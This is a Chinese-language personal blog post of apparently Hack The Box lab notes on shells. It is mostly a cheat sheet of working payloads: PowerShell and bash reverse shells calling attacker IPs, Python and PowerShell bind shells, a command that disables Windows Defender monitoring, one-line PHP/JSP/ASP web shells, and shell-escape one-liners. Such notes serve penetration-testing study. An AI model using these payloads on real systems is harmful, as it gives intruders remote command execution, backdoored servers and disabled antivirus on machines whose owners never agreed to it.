<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>å…³äºshellçš„ä¸€äº›ä¸œè¥¿ | Ak4izZ&#39;s æ»´åšå®¢å„¿</title>
  <meta name="author" content="Ak4izZ">
  
  <meta name="description" content="ä¸æƒ³é‡åˆ°ä¸€äº›ä¸œè¥¿ç”¨è¿‡ä¹‹åå®Œå…¨æ²¡æœ‰æ¦‚å¿µï¼Œç„¶åå°±æœ‰äº†è¿™ä¸ªåˆ†ç±»ã€‚"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="å…³äºshellçš„ä¸€äº›ä¸œè¥¿"/>
  <meta property="og:site_name" content="Ak4izZ&#39;s æ»´åšå®¢å„¿"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Ak4izZ&#39;s æ»´åšå®¢å„¿" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 5.4.2"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Ak4izZ&#39;s æ»´åšå®¢å„¿</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> å…³äºshellçš„ä¸€äº›ä¸œè¥¿</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>ä¸æƒ³é‡åˆ°ä¸€äº›ä¸œè¥¿ç”¨è¿‡ä¹‹åå®Œå…¨æ²¡æœ‰æ¦‚å¿µï¼Œç„¶åå°±æœ‰äº†è¿™ä¸ªåˆ†ç±»ã€‚</p>
<span id="more"></span>

<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><p>ç”¨åˆ°çš„ä¿©å·¥å…·</p>
<p><a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></p>
<aside> ğŸ’¡ A shell is a program that provides a computer user with an interface to input instructions into the system and view text output (Bash, Zsh, cmd, and PowerShell, for example).

<p>Every operating system has a shell, and to interact with it, we must use an application known as a <code>terminal emulator</code> . Here are some of the most common terminal emulators:</p>
<table>
<thead>
<tr>
<th>Terminal Emulator</th>
<th>Operating System</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://github.com/microsoft/terminal">https://github.com/microsoft/terminal</a></td>
<td>Windows</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://cmder.app/">https://cmder.app/</a></td>
<td>Windows</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.putty.org/">https://www.putty.org/</a></td>
<td>Windows</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://sw.kovidgoyal.net/kitty/">https://sw.kovidgoyal.net/kitty/</a></td>
<td>Windows, Linux and MacOS</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://github.com/alacritty/alacritty">https://github.com/alacritty/alacritty</a></td>
<td>Windows, Linux and MacOS</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://invisible-island.net/xterm/">https://invisible-island.net/xterm/</a></td>
<td>Linux</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/GNOME_Terminal">https://en.wikipedia.org/wiki/GNOME_Terminal</a></td>
<td>Linux</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://github.com/mate-desktop/mate-terminal">https://github.com/mate-desktop/mate-terminal</a></td>
<td>Linux</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://konsole.kde.org/">https://konsole.kde.org/</a></td>
<td>Linux</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Terminal_(macOS)">https://en.wikipedia.org/wiki/Terminal_(macOS)</a></td>
<td>MacOS</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://iterm2.com/">https://iterm2.com/</a></td>
<td>MacOS</td>
</tr>
</tbody></table>
<h2 id="Types-of-Shells"><a href="#Types-of-Shells" class="headerlink" title="Types of Shells"></a>Types of Shells</h2><ul>
<li>Reverse Shell</li>
<li>Bind Shell</li>
<li>Web Shell</li>
</ul>
<h2 id="ReverseShell"><a href="#ReverseShell" class="headerlink" title="ReverseShell"></a>ReverseShell</h2><p>éœ€è¦åœ¨æ”»å‡»æœºå¼€å¯ncç›‘å¬ï¼Œç„¶åå†ä»ç›®æ ‡æœºå™¨è¿è¡Œrevshellå‘½ä»¤ï¼Œå¯¹æ”»å‡»æœºåå‘è¿æ¥ã€‚</p>
<p>å¾ˆå¤šå‘½ä»¤å¯ä»¥åœ¨[Payload All The Things](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources&#x2F;Reverse Shell Cheatsheet.md)å’Œ<a target="_blank" rel="noopener" href="https://www.revshells.com/">Reverse Shell Generator</a>ä¸­æ‰¾åˆ°ã€‚</p>
<p><img src="/%E5%85%B3%E4%BA%8Eshell%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%9C%E8%A5%BF/revshell.png" alt="bindshell"></p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><pre class="line-numbers language-none"><code class="language-none">powershell -nop -c &quot;$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.123&#39;,1337);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;
powershell -nop -c &quot;$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.158&#39;,443);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;

# powershell -nop -c å¯åŠ¨ä¸€ä¸ªno profile çš„pwshï¼Œæ‰§è¡Œ&quot;&quot;ä¸­çš„å‘½ä»¤
# $client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.158&#39;,443) å®ä¾‹åŒ–ä¸€ä¸ªTCPClientå¯¹è±¡ï¼Œè¿æ¥åˆ°æ‹¬å·ä¸­çš„åœ°å€
# [byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;è¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ªç©ºå­—èŠ‚æµï¼Œå°†å®šå‘åˆ°ç­‰å¾…è¿æ¥çš„æ”»å‡»æ¡†ä¸Šçš„ TCP ä¾¦å¬å™¨ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨å¼€å¯äº†Windows Defender antivirusçš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå‘½ä»¤å¯èƒ½ä¼šè¢«é˜»æ­¢ï¼Œè¿™æ ·éœ€è¦ä½¿ç”¨ç®¡ç†å‘˜å…³é—­æ‰å®ƒï¼ˆçœŸå®åœºæ™¯ä¸‹å¦‚ä½•å®ç°ï¼Ÿï¼‰</p>
<img src="/2023/04/16/%E5%85%B3%E4%BA%8Eshell%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%9C%E8%A5%BF/1.png" class title="Untitled">

<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\\Users\\htb-student> <span class="token function">Set-MpPreference</span> <span class="token operator">-</span>DisableRealtimeMonitoring <span class="token boolean">$true</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> <span class="token parameter variable">-f</span> /tmp/f<span class="token punctuation">;</span> <span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span> <span class="token function">cat</span> /tmp/f <span class="token operator">|</span> /bin/bash <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">10.10</span>.14.12 <span class="token number">7777</span> <span class="token operator">></span> /tmp/f

<span class="token comment"># mkfifo --make a named pipe file at /tmp/f</span>
<span class="token comment"># ç¬¬ä¸€ä¸ª | å°† /bin/bash çš„æ ‡å‡†è¾“å…¥å’Œcatçš„æ ‡å‡†è¾“å‡ºè¿æ¥ï¼Œ2>&amp;1å°†æ ‡å‡†é”™è¯¯å’Œæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°ä¸‹ä¸€ä¸ªpipe</span>
<span class="token comment"># ä½¿ç”¨ncè¿æ¥ç›®æ ‡åœ°å€ï¼Œç›‘å¬ç«¯å£ï¼Œè¾“å‡ºä¼šé‡å®šå‘åˆ°/tmp/f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="BindShell"><a href="#BindShell" class="headerlink" title="BindShell"></a>BindShell</h2><img src="/2023/04/16/%E5%85%B3%E4%BA%8Eshell%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%9C%E8%A5%BF/bindshell.png" class title="bindshell">

<p>åœ¨ç›®æ ‡æœºä¸Šå¼€å¯å¯¹0.0.0.0çš„ç›‘å¬ï¼Œè¿™æ ·å°±èƒ½æ¥æ”¶åˆ°æ¥è‡ªå„æ–¹çš„è¿æ¥ï¼Œç„¶åå†ä»æ”»å‡»æœºä¸Šä½¿ç”¨ncè¿æ¥</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Target@server:~$ <span class="token function">rm</span> <span class="token parameter variable">-f</span> /tmp/f<span class="token punctuation">;</span> <span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span> <span class="token function">cat</span> /tmp/f <span class="token operator">|</span> /bin/bash <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">10.129</span>.41.200 <span class="token number">7777</span> <span class="token operator">></span> /tmp/f

<span class="token comment"># clientç«¯è¿æ¥</span>
Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ <span class="token function">nc</span> <span class="token parameter variable">-nv</span> <span class="token number">10.129</span>.41.200 <span class="token number">7777</span>

Target@server:~$
python <span class="token parameter variable">-c</span> <span class="token string">'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'</span>
powershell <span class="token parameter variable">-NoP</span> <span class="token parameter variable">-NonI</span> <span class="token parameter variable">-W</span> Hidden <span class="token parameter variable">-Exec</span> Bypass <span class="token parameter variable">-Command</span> <span class="token variable">$listener</span> <span class="token operator">=</span> <span class="token punctuation">[</span>System.Net.Sockets.TcpListener<span class="token punctuation">]</span><span class="token number">1234</span><span class="token punctuation">;</span> <span class="token variable">$listener</span>.start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token variable">$listener</span>.AcceptTcpClient<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span> <span class="token operator">=</span> <span class="token variable">$client</span>.GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token variable">$bytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">..</span><span class="token number">65535</span><span class="token operator">|</span>%<span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span>$i <span class="token operator">=</span> $stream.Read<span class="token punctuation">(</span>$bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $bytes.Length<span class="token punctuation">))</span></span> <span class="token parameter variable">-ne</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">(</span>New-Object <span class="token parameter variable">-TypeName</span> System.Text.ASCIIEncoding<span class="token punctuation">)</span>.GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span>,0, <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback</span> <span class="token operator">=</span> <span class="token punctuation">(</span>iex <span class="token variable">$data</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> Out-String <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback2</span> <span class="token operator">=</span> <span class="token variable">$sendback</span> + <span class="token string">"PS "</span> + <span class="token punctuation">(</span>pwd<span class="token punctuation">)</span>.Path + <span class="token string">" "</span><span class="token punctuation">;</span><span class="token variable">$sendbyte</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>text.encoding<span class="token punctuation">]</span>::ASCII<span class="token punctuation">)</span>.GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Write<span class="token punctuation">(</span><span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$client</span>.Close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="upgrading-TTY"><a href="#upgrading-TTY" class="headerlink" title="upgrading TTY"></a>upgrading TTY</h2><p>é€šå¸¸è¿æ¥shellä¹‹åï¼Œä¸ºäº†å¾—åˆ°å®Œæ•´äº¤äº’çš„shellï¼Œè¿˜éœ€è¦å‡çº§ttyã€‚å‚è€ƒ<a target="_blank" rel="noopener" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat">Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog</a></p>
<p>å¸¸ç”¨çš„åŠæ³•å°±æ˜¯å…ˆåœ¨è¿æ¥ä¸Šçš„shellä¸Š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">Ak4izZ@htb<span class="token punctuation">[</span><span class="token operator">/</span>htb<span class="token punctuation">]</span>$ python <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶å<code>ctrl+z</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ stty raw <span class="token parameter variable">-echo</span>
Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ <span class="token function">fg</span>

<span class="token punctuation">[</span>Enter<span class="token punctuation">]</span>
<span class="token punctuation">[</span>Enter<span class="token punctuation">]</span>
www-data@remotehost$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ€åå¯ä»¥ç»Ÿä¸€ä¸€ä¸‹å°ºå¯¸å’Œå¤§å°</p>
<p>å…ˆæŸ¥è¯¢ä¸€ä¸‹æœ¬æœºshellçš„</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$TERM</span>

xterm-256color

Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ stty size

<span class="token number">67</span> <span class="token number">318</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åå°†ç›®æ ‡çš„shellä¹Ÿè®¾ä¸ºåŒæ ·çš„</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@remotehost$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm-256color

www-data@remotehost$ stty rows <span class="token number">67</span> columns <span class="token number">318</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><a target="_blank" rel="noopener" href="https://github.com/jbarcia/Web-Shells/tree/master/laudanum">https://github.com/jbarcia/Web-Shells/tree/master/laudanum</a></p>
<p><code>web shell</code>æ˜¯ä¸€ä¸ªåŸºäºæµè§ˆå™¨çš„ shell ä¼šè¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒæ¥ä¸ Web æœåŠ¡å™¨çš„åº•å±‚æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚åŒæ ·ï¼Œè¦é€šè¿‡ web shell è·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œæˆ‘ä»¬å¿…é¡»é¦–å…ˆæ‰¾åˆ°å¯ä»¥ä¸ºæˆ‘ä»¬æä¾›æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„ç½‘ç«™æˆ– web åº”ç”¨ç¨‹åºæ¼æ´ã€‚</p>
<p>æœ€ç®€å•å°±æ˜¯ä¸€å¥è¯æœ¨é©¬</p>
<p>php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>jsp</p>
<pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token operator">&lt;</span><span class="token operator">%</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>asp</p>
<pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token operator">&lt;</span><span class="token operator">%</span> eval <span class="token function">request</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="antak-webShell"><a href="#antak-webShell" class="headerlink" title="antak webShell"></a>antak webShell</h3><p>Antak æ˜¯ Nishang é¡¹ç›®ä¸­åŒ…å«çš„ä¸€ä¸ªå†…ç½®çš„ web shell <a target="_blank" rel="noopener" href="http://asp.net/">ASP.Net</a>ã€‚Nishang æ˜¯ä¸€ä¸ªæ”»å‡»æ€§ PowerShell å·¥å…·é›†ï¼Œå¯ä»¥ä¸ºæ‚¨çš„ä»»ä½•éƒ¨åˆ†æä¾›é€‰é¡¹ã€‚antakæ–‡ä»¶å¯ä»¥åœ¨<code>/usr/share/nishang/Antak-Webshell</code>  æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°ã€‚Antak web shell çš„åŠŸèƒ½ç±»ä¼¼äº Powershell consoleã€‚ä½†æ˜¯ï¼Œå®ƒå°†æ¯ä¸ªå‘½ä»¤ä½œä¸ºä¸€ä¸ªæ–°è¿›ç¨‹æ‰§è¡Œã€‚å®ƒè¿˜å¯ä»¥åœ¨å†…å­˜ä¸­æ‰§è¡Œè„šæœ¬å¹¶å¯¹å‘é€çš„å‘½ä»¤è¿›è¡Œç¼–ç ã€‚ä½œä¸ºä¸€ä¸ª web shellï¼ŒAntak æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å·¥å…·ã€‚</p>
<h3 id="php-webShell"><a href="#php-webShell" class="headerlink" title="php webShell"></a>php webShell</h3><h1 id="æ‰§è¡Œshell"><a href="#æ‰§è¡Œshell" class="headerlink" title="æ‰§è¡Œshell"></a>æ‰§è¡Œshell</h1><p>perl</p>
<pre class="line-numbers language-none"><code class="language-none">perl â€”e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;
perl: exec &quot;&#x2F;bin&#x2F;sh&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ruby</p>
<pre class="line-numbers language-none"><code class="language-none">ruby: exec &quot;&#x2F;bin&#x2F;sh&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>lua</p>
<pre class="line-numbers language-none"><code class="language-none">lua: os.execute(&#39;&#x2F;bin&#x2F;sh&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>awk</p>
<pre class="line-numbers language-none"><code class="language-none">awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>find</p>
<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -name nameoffile -exec &#x2F;bin&#x2F;awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39; \\;
find . -exec &#x2F;bin&#x2F;sh \\; -quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>vim</p>
<pre class="line-numbers language-none"><code class="language-none">vim -c &#39;:!&#x2F;bin&#x2F;sh&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>vim-escape</p>
<h1 id="ä¸€äº›èµ·shellçš„å‘½ä»¤"><a href="#ä¸€äº›èµ·shellçš„å‘½ä»¤" class="headerlink" title="ä¸€äº›èµ·shellçš„å‘½ä»¤"></a>ä¸€äº›èµ·shellçš„å‘½ä»¤</h1><h2 id="PowerShell-one-liner"><a href="#PowerShell-one-liner" class="headerlink" title="PowerShell one-liner"></a>PowerShell one-liner</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$client</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TCPClient<span class="token punctuation">(</span><span class="token string">'10.10.14.15'</span><span class="token punctuation">,</span>443<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span> = <span class="token variable">$client</span><span class="token punctuation">.</span>GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token namespace">[byte[]]</span><span class="token variable">$bytes</span> = 0<span class="token punctuation">.</span><span class="token punctuation">.</span>65535<span class="token punctuation">|</span><span class="token operator">%</span><span class="token punctuation">&#123;</span>0<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$i</span> = <span class="token variable">$stream</span><span class="token punctuation">.</span>Read<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$bytes</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">;</span><span class="token variable">$data</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> <span class="token operator">-</span>TypeName System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>ASCIIEncoding<span class="token punctuation">)</span><span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback</span> = <span class="token punctuation">(</span><span class="token function">iex</span> <span class="token variable">$data</span> 2>&amp;1 <span class="token punctuation">|</span> <span class="token function">Out-String</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback2</span>  = <span class="token variable">$sendback</span> <span class="token operator">+</span> <span class="token string">'PS '</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">pwd</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Path <span class="token operator">+</span> <span class="token string">'> '</span><span class="token punctuation">;</span><span class="token variable">$sendbyte</span> = <span class="token punctuation">(</span><span class="token namespace">[text.encoding]</span>::ASCII<span class="token punctuation">)</span><span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span><span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token variable">$sendbyte</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$sendbyte</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span><span class="token punctuation">.</span>Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$client</span><span class="token punctuation">.</span>Close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

